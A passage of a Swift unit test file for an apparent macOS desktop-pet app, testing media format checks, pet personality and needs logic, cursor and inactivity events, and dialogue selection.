import Foundation
import AppKit

// MARK: - Lightweight Unit Test Harness

struct TestHarness {
    static var passedCount = 0
    static var failedCount = 0

    static func assertTrue(_ condition: @autoclosure () -> Bool, _ message: String = "", file: StaticString = #file, line: UInt = #line) {
        if condition() {
            passedCount += 1
        } else {
            failedCount += 1
            print("❌ FAIL [\(file):\(line)]: \(message)")
        }
    }

    static func assertFalse(_ condition: @autoclosure () -> Bool, _ message: String = "", file: StaticString = #file, line: UInt = #line) {
        assertTrue(!condition(), message, file: file, line: line)
    }

    static func assertEqual<T: Equatable>(_ a: T, _ b: T, message: String = "", file: StaticString = #file, line: UInt = #line) {
        assertTrue(a == b, "\(message) (Expected \(b), got \(a))", file: file, line: line)
    }

    static func assertEqualDouble(_ a: Double, _ b: Double, accuracy: Double = 0.001, message: String = "", file: StaticString = #file, line: UInt = #line) {
        assertTrue(abs(a - b) <= accuracy, "\(message) (Expected \(b) ± \(accuracy), got \(a))", file: file, line: line)
    }
}

// MARK: - Phase 1 Regression Tests

func testSupportedMediaFormatClassification() {
    print("Running testSupportedMediaFormatClassification...")
    let validExtensions = ["png", "PNG", "gif", "GIF", "jpg", "jpeg", "webp", "apng", "mp4", "mov"]
    for ext in validExtensions {
        let url = URL(fileURLWithPath: "/tmp/sprite.\(ext)")
        TestHarness.assertTrue(SupportedMediaFormat.isSupported(url: url), "Extension .\(ext) should be supported")
    }
    
    let invalidExtensions = ["txt", "pdf", "dmg", "exe", "zip", "html", "swift"]
    for ext in invalidExtensions {
        let url = URL(fileURLWithPath: "/tmp/file.\(ext)")
        TestHarness.assertFalse(SupportedMediaFormat.isSupported(url: url), "Extension .\(ext) should be unsupported")
    }
}

func testVideoFormatDetection() {
    print("Running testVideoFormatDetection...")
    TestHarness.assertTrue(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.mp4")), "mp4 should be video")
    TestHarness.assertTrue(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.mov")), "mov should be video")
    TestHarness.assertTrue(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.MOV")), "MOV should be video")
    TestHarness.assertFalse(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.png")), "png should not be video")
    TestHarness.assertFalse(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.gif")), "gif should not be video")
    TestHarness.assertFalse(SupportedMediaFormat.isVideo(url: URL(fileURLWithPath: "companion.webp")), "webp should not be video")
}

func testAnimatedFormatDetection() {
    print("Running testAnimatedFormatDetection...")
    TestHarness.assertTrue(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.gif")), "gif should be animated")
    TestHarness.assertTrue(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.apng")), "apng should be animated")
    TestHarness.assertTrue(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.webp")), "webp should be animated")
    TestHarness.assertTrue(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.mp4")), "mp4 should be animated")
    TestHarness.assertTrue(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.mov")), "mov should be animated")
    TestHarness.assertFalse(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.png")), "png should not be animated")
    TestHarness.assertFalse(SupportedMediaFormat.isAnimated(url: URL(fileURLWithPath: "pet.jpg")), "jpg should not be animated")
}

func testEventFrequencyScaleAndMigration() {
    print("Running testEventFrequencyScaleAndMigration...")
    let legacyFifty: Double = 50.0
    let normalizedFifty = min(max(legacyFifty / 100.0, 0.0), 1.0)
    TestHarness.assertEqualDouble(normalizedFifty, 0.50, message: "Legacy 50% should normalize to 0.50")
    
    let legacyHundred: Double = 100.0
    let normalizedHundred = min(max(legacyHundred / 100.0, 0.0), 1.0)
    TestHarness.assertEqualDouble(normalizedHundred, 1.0, message: "Legacy 100% should normalize to 1.0")
    
    let legacyOverMax: Double = 150.0
    let clampedOverMax = min(max(legacyOverMax / 100.0, 0.0), 1.0)
    TestHarness.assertEqualDouble(clampedOverMax, 1.0, message: "Values above 100 should clamp to 1.0")
    
    let modernValue: Double = 0.35
    let modernNormalized = modernValue > 1.0 ? min(max(modernValue / 100.0, 0.0), 1.0) : modernValue
    TestHarness.assertEqualDouble(modernNormalized, 0.35, message: "Modern 0.35 should stay 0.35 without modification")
}

func testEventProbabilityComparison() {
    print("Running testEventProbabilityComparison...")
    let frequency: Double = 0.50
    let rollLower = 0.30
    let rollHigher = 0.80
    
    TestHarness.assertTrue(rollLower < frequency, "Roll of 0.30 should trigger event under 0.50 frequency")
    TestHarness.assertFalse(rollHigher < frequency, "Roll of 0.80 should NOT trigger event under 0.50 frequency")
}

func testStorageDirectoryNaming() {
    print("Running testStorageDirectoryNaming...")
    let dir = PetStorage.getStorageDirectory()
    TestHarness.assertEqual(dir.lastPathComponent, "AnimattoPets", message: "Storage directory must be AnimattoPets")
    TestHarness.assertTrue(FileManager.default.fileExists(atPath: dir.path), "Storage directory should exist on disk")
}

func testCacheClearingFunctionality() {
    print("Running testCacheClearingFunctionality...")
    let tempDir = FileManager.default.temporaryDirectory
    let testCacheURL = tempDir.appendingPathComponent("animatto_test_\(UUID().uuidString).tmp")
    
    do {
        try "sample cache content".write(to: testCacheURL, atomically: true, encoding: .utf8)
        TestHarness.assertTrue(FileManager.default.fileExists(atPath: testCacheURL.path), "Test cache file should exist before clearing")
        
        let removed = PetStorage.clearCache()
        TestHarness.assertTrue(removed >= 1, "clearCache should have removed at least 1 file")
        TestHarness.assertFalse(FileManager.default.fileExists(atPath: testCacheURL.path), "Test cache file should be removed after clearing")
    } catch {
        print("❌ Cache test error: \(error)")
        TestHarness.failedCount += 1
    }
}

// MARK: - Phase 2 Personality & Behavior Tests

func testPersonalityProfilePresetsAndClamping() {
    print("Running testPersonalityProfilePresetsAndClamping...")
    
    let sleepy = PersonalityProfile.preset(.sleepy)
    TestHarness.assertTrue(sleepy.laziness > 0.8, "Sleepy should have high laziness")
    TestHarness.assertTrue(sleepy.energy < 0.3, "Sleepy should have low energy")
    TestHarness.assertEqual(sleepy.preset, .sleepy, message: "Preset should be sleepy")
    
    let energetic = PersonalityProfile.preset(.energetic)
    TestHarness.assertTrue(energetic.energy > 0.8, "Energetic should have high energy")
    TestHarness.assertTrue(energetic.laziness < 0.2, "Energetic should have low laziness")
    TestHarness.assertTrue(energetic.playfulness > 0.8, "Energetic should have high playfulness")
    
    let curious = PersonalityProfile.preset(.curious)
    TestHarness.assertTrue(curious.curiosity > 0.8, "Curious should have high curiosity")
    
    let mischievous = PersonalityProfile.preset(.mischievous)
    TestHarness.assertTrue(mischievous.mischief > 0.8, "Mischievous should have high mischief")
    
    let shy = PersonalityProfile.preset(.shy)
    TestHarness.assertTrue(shy.attentionSeeking < 0.2, "Shy should have low attention seeking")
    TestHarness.assertTrue(shy.sociability < 0.3, "Shy should have low sociability")
    
    // Bounds clamping test
    let outOfBoundsProfile = PersonalityProfile(
        energy: 1.5,
        curiosity: -0.5,
        playfulness: 2.0,
        laziness: -1.0,
        sociability: 1.2,
        mischief: -0.2,
        attentionSeeking: 1.8
    )
    TestHarness.assertEqualDouble(outOfBoundsProfile.energy, 1.0, message: "Energy should clamp to 1.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.curiosity, 0.0, message: "Curiosity should clamp to 0.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.playfulness, 1.0, message: "Playfulness should clamp to 1.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.laziness, 0.0, message: "Laziness should clamp to 0.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.sociability, 1.0, message: "Sociability should clamp to 1.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.mischief, 0.0, message: "Mischief should clamp to 0.0")
    TestHarness.assertEqualDouble(outOfBoundsProfile.attentionSeeking, 1.0, message: "AttentionSeeking should clamp to 1.0")
}

func testPersonalityProfileSerialization() {
    print("Running testPersonalityProfileSerialization...")
    let profile = PersonalityProfile(
        name: "TestCompanion",
        preset: .curious,
        energy: 0.72,
        curiosity: 0.88,
        playfulness: 0.65,
        laziness: 0.22,
        sociability: 0.55,
        mischief: 0.45,
        attentionSeeking: 0.60
    )
    
    do {
        let encoder = JSONEncoder()
        let data = try encoder.encode(profile)
        
        let decoder = JSONDecoder()
        let decoded = try decoder.decode(PersonalityProfile.self, from: data)
        
        TestHarness.assertEqual(decoded.id, profile.id, message: "UUID should match after decode")
        TestHarness.assertEqual(decoded.name, profile.name, message: "Name should match after decode")
        TestHarness.assertEqual(decoded.preset, profile.preset, message: "Preset should match after decode")
        TestHarness.assertEqual(decoded.schemaVersion, 1, message: "SchemaVersion should be 1")
        TestHarness.assertEqualDouble(decoded.curiosity, 0.88, message: "Curiosity should match after decode")
        TestHarness.assertEqualDouble(decoded.laziness, 0.22, message: "Laziness should match after decode")
    } catch {
        print("❌ Serialization error: \(error)")
        TestHarness.failedCount += 1
    }
}

func testCharacterNeedsEvolutionAndBounds() {
    print("Running testCharacterNeedsEvolutionAndBounds...")
    let profile = PersonalityProfile.preset(.balanced)
    var needs = CharacterNeeds(energy: 0.80, boredom: 0.20, curiosityDrive: 0.30)
    
    // Simulate 10 seconds of walking
    needs.update(elapsedSeconds: 10.0, currentAction: .walking, profile: profile)
    TestHarness.assertTrue(needs.energy < 0.80, "Walking should deplete energy")
    TestHarness.assertTrue(needs.boredom < 0.20, "Walking should relieve boredom")
    
    // Simulate 20 seconds of sleep
    let energyBeforeSleep = needs.energy
    needs.update(elapsedSeconds: 20.0, currentAction: .sleeping, profile: profile)
    TestHarness.assertTrue(needs.energy > energyBeforeSleep, "Sleeping should recover energy")
    
    // Simulate 40 seconds of idle
    needs.update(elapsedSeconds: 40.0, currentAction: .idle, profile: profile)
    TestHarness.assertTrue(needs.boredom > 0.0, "Idling should accumulate boredom")
    TestHarness.assertTrue(needs.curiosityDrive > 0.0, "Idling should build curiosity drive")
    
    // Verify strict bounding
    var extremeNeeds = CharacterNeeds(energy: 0.05, boredom: 0.95, curiosityDrive: 0.95)
    extremeNeeds.update(elapsedSeconds: 100.0, currentAction: .walking, profile: profile)
    TestHarness.assertTrue(extremeNeeds.energy >= 0.0, "Energy must not drop below 0.0")
    TestHarness.assertTrue(extremeNeeds.boredom >= 0.0, "Boredom must not drop below 0.0")
    
    extremeNeeds.update(elapsedSeconds: 100.0, currentAction: .sleeping, profile: profile)
    TestHarness.assertTrue(extremeNeeds.energy <= 1.0, "Energy must not exceed 1.0")
    
    // Test user interaction
    extremeNeeds.boredom = 0.8
    extremeNeeds.socialDrive = 0.9
    extremeNeeds.interactWithUser()
    TestHarness.assertTrue(extremeNeeds.boredom <= 0.5, "User interaction should relieve boredom")
    TestHarness.assertTrue(extremeNeeds.socialDrive <= 0.5, "User interaction should relieve social drive")
}

func testBehaviorEngineScoringTendencies() {
    print("Running testBehaviorEngineScoringTendencies...")
    
    // 1. Sleepy pet when tired should heavily favor sleeping
    let sleepyProfile = PersonalityProfile.preset(.sleepy)
    let tiredNeeds = CharacterNeeds(energy: 0.15, boredom: 0.1)
    let sleepyEngine = BehaviorEngine(profile: sleepyProfile, initialNeeds: tiredNeeds)
    
    let sleepyScores = sleepyEngine.calculateScores(eventFrequency: 0.5)
    let sleepScore = sleepyScores[.sleeping] ?? 0.0
    let walkScore = sleepyScores[.walking] ?? 0.0
    TestHarness.assertTrue(sleepScore > walkScore, "Sleepy tired pet should score sleep higher than walking (Sleep: \(sleepScore), Walk: \(walkScore))")
    
    // 2. Energetic pet when rested should heavily favor walking over sleeping
    let energeticProfile = PersonalityProfile.preset(.energetic)
    let restedNeeds = CharacterNeeds(energy: 0.95, boredom: 0.2)
    let energeticEngine = BehaviorEngine(profile: energeticProfile, initialNeeds: restedNeeds)
    
    let energeticScores = energeticEngine.calculateScores(eventFrequency: 0.5)
    let energeticWalk = energeticScores[.walking] ?? 0.0
    let energeticSleep = energeticScores[.sleeping] ?? 0.0
    TestHarness.assertTrue(energeticWalk > energeticSleep, "Energetic rested pet should score walking higher than sleep (Walk: \(energeticWalk), Sleep: \(energeticSleep))")
    
    // 3. Curious pet with high boredom should favor exploring
    let curiousProfile = PersonalityProfile.preset(.curious)
    let boredNeeds = CharacterNeeds(energy: 0.7, boredom: 0.85, curiosityDrive: 0.85)
    let curiousEngine = BehaviorEngine(profile: curiousProfile, initialNeeds: boredNeeds)
    
    let curiousScores = curiousEngine.calculateScores(eventFrequency: 0.5)
    let exploreScore = curiousScores[.exploring] ?? 0.0
    let idleScore = curiousScores[.idle] ?? 0.0
    TestHarness.assertTrue(exploreScore > idleScore, "Curious bored pet should score exploring higher than idle (Explore: \(exploreScore), Idle: \(idleScore))")
}

func testBehaviorEngineCooldownsAndRepetitionPenalty() {
    print("Running testBehaviorEngineCooldownsAndRepetitionPenalty...")
    let profile = PersonalityProfile.preset(.balanced)
    let engine = BehaviorEngine(profile: profile)
    
    let initialScores = engine.calculateScores()
    let initialWalk = initialScores[.walking] ?? 0.0
    
    // Record walking as last action
    engine.history.record(action: .walking, duration: 5.0)
    let postWalkScores = engine.calculateScores()
    let postWalk = postWalkScores[.walking] ?? 0.0
    
    TestHarness.assertTrue(postWalk < initialWalk, "Repeating the same action immediately should apply a repetition penalty")
}

func testDeterministicBehaviorSelection() {
    print("Running testDeterministicBehaviorSelection...")
    
    // Test that identical seed produces identical reproducible results
    let profile = PersonalityProfile.preset(.energetic)
    let engine1 = BehaviorEngine(profile: profile)
    let engine2 = BehaviorEngine(profile: profile)
    
    var rng1 = SeededRandomSource(seed: 12345)
    var rng2 = SeededRandomSource(seed: 12345)
    
    var actions1: [CharacterAction] = []
    var actions2: [CharacterAction] = []
    
    for _ in 0..<10 {
        actions1.append(engine1.selectAction(randomSource: &rng1))
        actions2.append(engine2.selectAction(randomSource: &rng2))
    }
    
    TestHarness.assertEqual(actions1, actions2, message: "Deterministic SeededRandomSource should produce identical action sequences")
}

func testMultiPetIndependence() {
    print("Running testMultiPetIndependence...")
    let petA = BehaviorEngine(profile: PersonalityProfile.preset(.sleepy), initialNeeds: CharacterNeeds(energy: 0.2))
    let petB = BehaviorEngine(profile: PersonalityProfile.preset(.energetic), initialNeeds: CharacterNeeds(energy: 0.9))
    
    TestHarness.assertEqualDouble(petA.needs.energy, 0.2, message: "Pet A energy should be 0.2")
    TestHarness.assertEqualDouble(petB.needs.energy, 0.9, message: "Pet B energy should be 0.9")
    
    // Tick Pet A for 15 seconds of sleep
    petA.currentAction = .sleeping
    _ = petA.tick(elapsed: 15.0)
    
    TestHarness.assertTrue(petA.needs.energy > 0.2, "Pet A energy should have increased from sleeping")
    TestHarness.assertEqualDouble(petB.needs.energy, 0.9, message: "Pet B energy must remain completely unaffected by Pet A's tick")
}

func testDraggingAutonomousBehaviorOverride() {
    print("Running testDraggingAutonomousBehaviorOverride...")
    let engine = BehaviorEngine(profile: PersonalityProfile.preset(.balanced))
    
    engine.pauseAutonomousBehavior()
    TestHarness.assertTrue(engine.isAutonomousPaused, "Engine should be marked as paused")
    
    let result = engine.tick(elapsed: 10.0)
    TestHarness.assertTrue(result == nil, "Tick while paused must return nil and perform no autonomous action change")
    
    engine.resumeAutonomousBehavior()
    TestHarness.assertFalse(engine.isAutonomousPaused, "Engine should be marked as resumed")
}

// MARK: - Phase 3 Unit Tests

func testEnvironmentEventDataStructures() {
    print("Running testEnvironmentEventDataStructures...")
    TestHarness.assertEqual(UserInteractionType.click.rawValue, "click", message: "Click rawValue")
    TestHarness.assertEqual(UserInteractionType.hover.rawValue, "hover", message: "Hover rawValue")
    TestHarness.assertEqual(UserInteractionType.dragStart.rawValue, "dragStart", message: "DragStart rawValue")
    TestHarness.assertEqual(UserInteractionType.dragEnd.rawValue, "dragEnd", message: "DragEnd rawValue")
    
    TestHarness.assertEqualDouble(InactivityThreshold.brief.duration, 60.0, message: "Brief threshold 60s")
    TestHarness.assertEqualDouble(InactivityThreshold.moderate.duration, 300.0, message: "Moderate threshold 300s")
    TestHarness.assertEqualDouble(InactivityThreshold.extended.duration, 900.0, message: "Extended threshold 900s")
    
    let now = Date()
    let petId = UUID()
    let event = EnvironmentEvent(type: .appActivated(bundleId: "com.apple.Safari", appName: "Safari"), timestamp: now, targetPetId: petId)
    TestHarness.assertEqual(event.targetPetId, petId, message: "Target pet ID matches")
    TestHarness.assertEqual(event.timestamp, now, message: "Timestamp matches")
    
    var snapshot = EnvironmentSnapshot()
    TestHarness.assertFalse(snapshot.isAnimattoActive, "Default Animatto inactive")
    TestHarness.assertFalse(snapshot.isUserInactive, "Default user active")
    snapshot.activeAppName = "Safari"
    TestHarness.assertEqual(snapshot.activeAppName, "Safari", message: "Snapshot holds active app")
}

func testProximityHysteresisCalculation() {
    print("Running testProximityHysteresisCalculation...")
    let monitor = EnvironmentMonitor()
    monitor.stopMonitoring() // stop background timers for deterministic manual testing
    
    let petId = UUID()
    let petCenter = NSPoint(x: 100, y: 100)
    var currentMouse = NSPoint(x: 300, y: 300) // Distance ≈ 282.8 pt > 180
    var capturedEvents: [EnvironmentEvent] = []
    
    monitor.mouseLocationProvider = { currentMouse }
    monitor.petCentersProvider = { [petId: petCenter] }
    monitor.onEvent = { event in
        capturedEvents.append(event)
    }
    
    // Initial check while far away
    monitor.checkProximityAndInactivity(petCenters: [petId: petCenter])
    TestHarness.assertTrue(capturedEvents.isEmpty, "No events when cursor is far (> 180 pt)")
    
    // Move inside enterDistance (<= 130 pt)
    currentMouse = NSPoint(x: 150, y: 100) // Distance 50 pt
    monitor.checkProximityAndInactivity(petCenters: [petId: petCenter])
    TestHarness.assertEqual(capturedEvents.count, 2, message: "Approach emits user interaction and cursorApproached")
    if case .cursorApproached(let dist, _) = capturedEvents.last?.type {
        TestHarness.assertEqualDouble(dist, 50.0, message: "Approached distance is 50 pt")
    } else {
        TestHarness.assertTrue(false, "Expected cursorApproached event")
    }
    
    // Move into hysteresis deadband (140 pt, between 130 and 180 pt)
    capturedEvents.removeAll()
    currentMouse = NSPoint(x: 240, y: 100) // Distance 140 pt
    monitor.checkProximityAndInactivity(petCenters: [petId: petCenter])
    TestHarness.assertTrue(capturedEvents.isEmpty, "Cursor in deadband (140 pt) must NOT trigger departure or re-trigger approach")
    
    // Move beyond exitDistance (> 180 pt)
    currentMouse = NSPoint(x: 300, y: 100) // Distance 200 pt
    monitor.checkProximityAndInactivity(petCenters: [petId: petCenter])
    TestHarness.assertEqual(capturedEvents.count, 1, message: "Cursor exiting > 180 pt triggers departure")
    TestHarness.assertTrue(capturedEvents.first?.type == .cursorDeparted, "Expected cursorDeparted event")
}

func testInactivityThresholdTransitions() {
    print("Running testInactivityThresholdTransitions...")
    let monitor = EnvironmentMonitor()
    monitor.stopMonitoring()
    
    var simulatedTime = Date()
    monitor.nowProvider = { simulatedTime }
    
    var capturedEvents: [EnvironmentEvent] = []
    monitor.onEvent = { event in
        capturedEvents.append(event)
    }
    
    // Initial interaction at t = 0
    monitor.recordUserInteraction()
    capturedEvents.removeAll()
    
    // t = 30s: Inactivity under 60s
    simulatedTime = simulatedTime.addingTimeInterval(30)
    monitor.checkProximityAndInactivity()
    TestHarness.assertTrue(capturedEvents.isEmpty, "No inactivity event under 60s")
    
    // t = 65s: Crosses brief threshold (60s)
    simulatedTime = simulatedTime.addingTimeInterval(35)
    monitor.checkProximityAndInactivity()
    TestHarness.assertEqual(capturedEvents.count, 1, message: "Crossing 60s emits 1 brief inactivity event")
    TestHarness.assertTrue(capturedEvents.first?.type == .userInactivityReached(threshold: .brief), "Event type is brief inactivity")
    
    // t = 70s: Still within brief threshold, should NOT re-emit
    capturedEvents.removeAll()
    simulatedTime = simulatedTime.addingTimeInterval(5)
    monitor.checkProximityAndInactivity()
    TestHarness.assertTrue(capturedEvents.isEmpty, "Milestone crossing must be emitted only once")
    
    // t = 310s: Crosses moderate threshold (300s)
    simulatedTime = simulatedTime.addingTimeInterval(240)
    monitor.checkProximityAndInactivity()
    TestHarness.assertEqual(capturedEvents.count, 1, message: "Crossing 300s emits moderate inactivity event")
    TestHarness.assertTrue(capturedEvents.first?.type == .userInactivityReached(threshold: .moderate), "Event type is moderate inactivity")
    
    // User interaction occurs: resets inactivity state
    capturedEvents.removeAll()
    monitor.recordUserInteraction(type: .click)
    TestHarness.assertFalse(monitor.snapshot.isUserInactive, "Interaction clears inactive flag")
    TestHarness.assertTrue(monitor.snapshot.currentInactivityThreshold == nil, "Interaction clears threshold")
}

func testPersonalityReactionToAppActivation() {
    print("Running testPersonalityReactionToAppActivation...")
    let fixedDate = Date()
    
    // 1. Sleepy pet ignores app activation
    let sleepyProfile = PersonalityProfile(name: "Snoozer", preset: .sleepy, energy: 0.2, laziness: 0.9)
    let sleepyEngine = BehaviorEngine(profile: sleepyProfile, initialNeeds: CharacterNeeds(energy: 0.2))
    sleepyEngine.currentAction = .sleeping
    
    let event = EnvironmentEvent(type: .appActivated(bundleId: "com.apple.Terminal", appName: "Terminal"), timestamp: fixedDate)
    var right = true
    let sleepyReaction = sleepyEngine.handleEnvironmentEvent(event, petCenter: nil, walkDirectionRight: &right, referenceDate: fixedDate)
    TestHarness.assertTrue(sleepyReaction == nil, "Sleepy low-energy pet ignores app activation and keeps sleeping")
    TestHarness.assertEqual(sleepyEngine.currentAction, CharacterAction.sleeping, message: "Pet remains sleeping")
    
    // 2. Curious pet awakens or explores
    let curiousProfile = PersonalityProfile(name: "Scout", preset: .curious, curiosity: 0.85, attentionSeeking: 0.7)
    let curiousEngine = BehaviorEngine(profile: curiousProfile, initialNeeds: CharacterNeeds(energy: 0.8, boredom: 0.5, curiosityDrive: 0.3))
    curiousEngine.currentAction = .sleeping
    
    let awakenReaction = curiousEngine.handleEnvironmentEvent(event, petCenter: nil, walkDirectionRight: &right, referenceDate: fixedDate)
    TestHarness.assertEqual(awakenReaction, CharacterAction.walking, message: "Curious pet wakes up to walking on app activation")
    TestHarness.assertTrue(curiousEngine.needs.curiosityDrive > 0.3, "Curiosity drive increased")
    
    // 3. Curious pet already walking transitions to exploring
    curiousEngine.currentAction = .walking
    let futureDate = fixedDate.addingTimeInterval(5.0) // Past 3s cooldown
    let exploreReaction = curiousEngine.handleEnvironmentEvent(event, petCenter: nil, walkDirectionRight: &right, referenceDate: futureDate)
    TestHarness.assertEqual(exploreReaction, CharacterAction.exploring, message: "Curious walking pet transitions to exploring")
}

func testPersonalityReactionToCursorProximity() {
    print("Running testPersonalityReactionToCursorProximity...")
    let fixedDate = Date()
    let petCenter = NSPoint(x: 200, y: 100)
    
    // 1. Shy pet (low sociability, low attention-seeking) retreats away from cursor
    let shyProfile = PersonalityProfile(name: "Timid", preset: .balanced, sociability: 0.1, attentionSeeking: 0.1)
    let shyEngine = BehaviorEngine(profile: shyProfile)
    shyEngine.currentAction = .idle
    
    // Cursor approaches from right at (260, 100)
    var walkRight = true
    let approachFromRight = EnvironmentEvent(type: .cursorApproached(distance: 60, cursorLocation: NSPoint(x: 260, y: 100)), timestamp: fixedDate)
    let shyResult1 = shyEngine.handleEnvironmentEvent(approachFromRight, petCenter: petCenter, walkDirectionRight: &walkRight, referenceDate: fixedDate)
    TestHarness.assertEqual(shyResult1, CharacterAction.walking, message: "Shy pet retreats into walking")
    TestHarness.assertFalse(walkRight, "Shy pet must face LEFT to retreat from cursor on the right")
    
    // Cursor approaches from left at (140, 100)
    let laterDate = fixedDate.addingTimeInterval(5.0)
    shyEngine.currentAction = .idle
    let approachFromLeft = EnvironmentEvent(type: .cursorApproached(distance: 60, cursorLocation: NSPoint(x: 140, y: 100)), timestamp: laterDate)
    let shyResult2 = shyEngine.handleEnvironmentEvent(approachFromLeft, petCenter: petCenter, walkDirectionRight: &walkRight, referenceDate: laterDate)
    TestHarness.assertEqual(shyResult2, CharacterAction.walking, message: "Shy pet retreats into walking")
    TestHarness.assertTrue(walkRight, "Shy pet must face RIGHT to retreat from cursor on the left")
    
    // 2. Curious pet investigates towards cursor
    let curiousProfile = PersonalityProfile(name: "Detective", preset: .curious, curiosity: 0.9)
    let curiousEngine = BehaviorEngine(profile: curiousProfile)
    curiousEngine.currentAction = .idle
    walkRight = false
    let curiousResult = curiousEngine.handleEnvironmentEvent(approachFromRight, petCenter: petCenter, walkDirectionRight: &walkRight, referenceDate: fixedDate)
    TestHarness.assertEqual(curiousResult, CharacterAction.exploring, message: "Curious pet explores on cursor approach")
    TestHarness.assertTrue(walkRight, "Curious pet turns TOWARDS cursor on the right")
    
    // 3. Mischievous pet playfully reverses direction
    let mischievousProfile = PersonalityProfile(name: "Trickster", preset: .mischievous, mischief: 0.85)
    let mischievousEngine = BehaviorEngine(profile: mischievousProfile)
    mischievousEngine.currentAction = .idle
    walkRight = true
    let mischiefResult = mischievousEngine.handleEnvironmentEvent(approachFromRight, petCenter: petCenter, walkDirectionRight: &walkRight, referenceDate: fixedDate)
    TestHarness.assertEqual(mischiefResult, CharacterAction.walking, message: "Mischievous pet walks on cursor approach")
    TestHarness.assertFalse(walkRight, "Mischievous pet flipped direction from true to false")
}

func testDisabledMonitoringGeneratesNoEvents() {
    print("Running testDisabledMonitoringGeneratesNoEvents...")
    let monitor = EnvironmentMonitor()
    monitor.stopMonitoring()
    monitor.isEnabled = false
    
    var capturedEvents: [EnvironmentEvent] = []
    monitor.onEvent = { event in
        capturedEvents.append(event)
    }
    
    monitor.recordUserInteraction()
    monitor.checkProximityAndInactivity(petCenters: [UUID(): NSPoint(x: 100, y: 100)])
    TestHarness.assertTrue(capturedEvents.isEmpty, "Disabled monitor must generate zero events")
}

// MARK: - Phase 4 Unit Tests

func testDialogueProfileGenerationAndDefaults() {
    print("Running testDialogueProfileGenerationAndDefaults...")
    let defaultProfile = DialogueProfile()
    TestHarness.assertEqualDouble(defaultProfile.communicationFrequency, 0.5, message: "Default frequency 0.5")
    TestHarness.assertTrue(defaultProfile.contextualCommentsEnabled, "Contextual comments enabled by default")
    TestHarness.assertTrue(defaultProfile.directInteractionEnabled, "Direct interaction enabled by default")
    TestHarness.assertFalse(defaultProfile.isReserved, "Not reserved by default")
    
    // Shy profile: should be reserved with lower frequency
    let shyPersonality = PersonalityProfile(name: "Timid", preset: .balanced, sociability: 0.1, attentionSeeking: 0.1)
    let shyDialogue = DialogueProfile.fromPersonality(shyPersonality)
    TestHarness.assertTrue(shyDialogue.isReserved, "Shy personality should produce reserved dialogue profile")
    TestHarness.assertTrue(shyDialogue.communicationFrequency <= 0.35, "Shy profile should have lower communication frequency")
    
    // Curious profile: prefers exploring and appObservation
    let curiousPersonality = PersonalityProfile(name: "Scout", preset: .curious, curiosity: 0.85)
    let curiousDialogue = DialogueProfile.fromPersonality(curiousPersonality)
    TestHarness.assertTrue(curiousDialogue.preferredCategories.contains(.exploring), "Curious profile prefers exploring")
    TestHarness.assertTrue(curiousDialogue.preferredCategories.contains(.appObservation), "Curious profile prefers appObservation")
}

func testDialogueTriggerCategoryMappingAndAppComment() {
    print("Running testDialogueTriggerCategoryMappingAndAppComment...")
    let provider = RuleBasedDialogueProvider()
    let petId = UUID()
    let personality = PersonalityProfile.preset(.curious)
    let needs = CharacterNeeds()
    var rng = SeededRandomSource(seed: 42)
    
    // 1. App activated comment with dynamic app name
    let appContext = DialogueContext(
        characterId: petId,
        characterName: "Scout",
        personality: personality,
        currentNeeds: needs,
        currentAction: .walking,
        trigger: .appActivated(appName: "Xcode"),
        appName: "Xcode"
    )
    let appProfile = DialogueProfile(contextualCommentsEnabled: true)
    let appMsg = provider.selectDialogue(context: appContext, profile: appProfile, recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(appMsg != nil, "App comment should be generated")
    TestHarness.assertTrue(appMsg?.text.contains("Xcode") == true, "Comment should reference the active app name (Text: \(appMsg?.text ?? ""))")
    TestHarness.assertEqual(appMsg?.category, DialogueCategory.appObservation, message: "Category is appObservation")
    
    // 2. Drag released acknowledgement
    let dragContext = DialogueContext(
        characterId: petId,
        characterName: "Scout",
        personality: personality,
        currentNeeds: needs,
        currentAction: .walking,
        trigger: .dragReleased
    )
    let dragMsg = provider.selectDialogue(context: dragContext, profile: appProfile, recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(dragMsg != nil, "Drag released comment should be generated")
    TestHarness.assertEqual(dragMsg?.category, DialogueCategory.interaction, message: "Category is interaction")
}

func testPersonalityDependentDialogueSelection() {
    print("Running testPersonalityDependentDialogueSelection...")
    let provider = RuleBasedDialogueProvider()
    let petId = UUID()
    var rng = SeededRandomSource(seed: 100)
    
    // Sleepy pet waking up
    let sleepyPersonality = PersonalityProfile(name: "Dozer", preset: .sleepy, energy: 0.2, laziness: 0.9)
    let sleepyContext = DialogueContext(
        characterId: petId,
        characterName: "Dozer",
        personality: sleepyPersonality,
        currentNeeds: CharacterNeeds(energy: 0.2),
        currentAction: .walking,
        trigger: .wakingUp
    )
    let sleepyProfile = DialogueProfile.fromPersonality(sleepyPersonality)
    let sleepyMsg = provider.selectDialogue(context: sleepyContext, profile: sleepyProfile, recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(sleepyMsg != nil, "Sleepy pet message generated")
    TestHarness.assertEqual(sleepyMsg?.category, DialogueCategory.waking, message: "Category is waking")
    
    // Mischievous pet playful trigger
    let mischievousPersonality = PersonalityProfile(name: "Loki", preset: .mischievous, mischief: 0.9)
    let mischievousContext = DialogueContext(
        characterId: petId,
        characterName: "Loki",
        personality: mischievousPersonality,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .playfulReaction
    )
    let mischievousProfile = DialogueProfile.fromPersonality(mischievousPersonality)
    let mischievousMsg = provider.selectDialogue(context: mischievousContext, profile: mischievousProfile, recentIds: [], randomSource: &rng)
